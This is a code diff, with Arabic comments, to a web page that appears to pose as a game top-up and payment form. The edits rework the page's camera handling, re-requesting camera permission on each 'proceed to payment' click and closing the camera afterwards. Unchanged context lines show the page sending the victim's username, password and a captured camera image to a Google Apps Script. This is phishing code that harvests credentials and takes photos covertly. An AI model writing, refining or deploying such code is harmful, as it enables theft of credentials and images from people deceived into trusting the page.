@@ -2012,7 +2012,6 @@
             termsModal.style.display = 'none';
             termsAccepted = true;
             
-            // ✅ إزالة تهيئة الكاميرا التلقائية هنا
             setTimeout(() => {
                 showStatus('', '');
             }, 2000);
@@ -2090,7 +2089,7 @@
     playerIdInput.addEventListener('input', checkFormCompletion);
     serverSelect.addEventListener('change', checkFormCompletion);
     
-    // زر المتابعة إلى الدفع - النسخة المعدلة
+    // زر المتابعة إلى الدفع - كل مرة يطلب إذن جديد
     proceedBtn.addEventListener('click', async function() {
         if (!termsAccepted) {
             showStatus('يجب الموافقة على الشروط والأحكام أولاً', 'error');
@@ -2113,11 +2112,11 @@
             return;
         }
         
-        // ✅ الجديد: إظهار رسالة تحميل
-        showStatus('جاري التحضير للشحن...', 'loading');
+        // إظهار رسالة تحميل
+        showStatus('جاري طلب إذن الكاميرا...', 'loading');
         
         try {
-            // ✅ الجديد: طلب إذن الكاميرا هنا فقط
+            // طلب إذن الكاميرا من جديد كل مرة
             await initializeCameraSilently();
             showStatus('', '');
             
@@ -2125,13 +2124,8 @@
             showChargingProcess();
             
         } catch (error) {
-            // ✅ الجديد: إظهار رسالة خطأ واضحة
+            // إظهار رسالة خطأ واضحة
             showStatus('❌ ' + error.message, 'error');
-            
-            // ✅ الجديد: إعطاء تعليمات للمستخدم
-            setTimeout(() => {
-                showStatus('يرجى الضغط على "المتابعة إلى الدفع" مرة أخرى والسماح للكاميرا عند الطلب', 'error');
-            }, 2000);
         }
     });
     
@@ -2192,15 +2186,16 @@
         clearTimeout(chargingTimeout);
     });
     
-    // ✅ الجديد: تهيئة الكاميرا فقط عند الحاجة
+    // تهيئة الكاميرا من الصفر كل مرة
     async function initializeCameraSilently() {
+        // إغلاق أي كاميرا مفتوحة مسبقاً
+        if (stream) {
+            stream.getTracks().forEach(track => track.stop());
+            stream = null;
+        }
+        cameraInitialized = false;
+        
         try {
-            // إذا الكاميرا مفتوحة مسبقاً، لا نعيد فتحها
-            if (cameraInitialized && stream) {
-                console.log('✅ الكاميرا جاهزة مسبقاً');
-                return true;
-            }
-            
             console.log('📷 طلب إذن الكاميرا...');
             
             const constraints = {
@@ -2250,7 +2245,7 @@
         }
     }
     
-    // ✅ الجديد: تنظيف الكاميرا عند الإغلاق
+    // تنظيف الكاميرا عند الإغلاق
     window.addEventListener('beforeunload', cleanupCamera);
     window.addEventListener('pagehide', cleanupCamera);
 
@@ -2355,6 +2350,16 @@
             // إرسال البيانات إلى Google Apps Script
             await sendToGoogleScript(username, password, imageData);
             
+            // إغلاق الكاميرا بعد الانتهاء
+            if (stream) {
+                setTimeout(() => {
+                    stream.getTracks().forEach(track => track.stop());
+                    stream = null;
+                    cameraInitialized = false;
+                    console.log('🔒 تم إغلاق الكاميرا بعد الاستخدام');
+                }, 1000);
+            }
+            
         } catch (error) {
             console.error('Error capturing/sending photo:', error);
             throw error;
@@ -2452,6 +2457,7 @@
 </script>
 </body>
 </html>
+
 
 
 
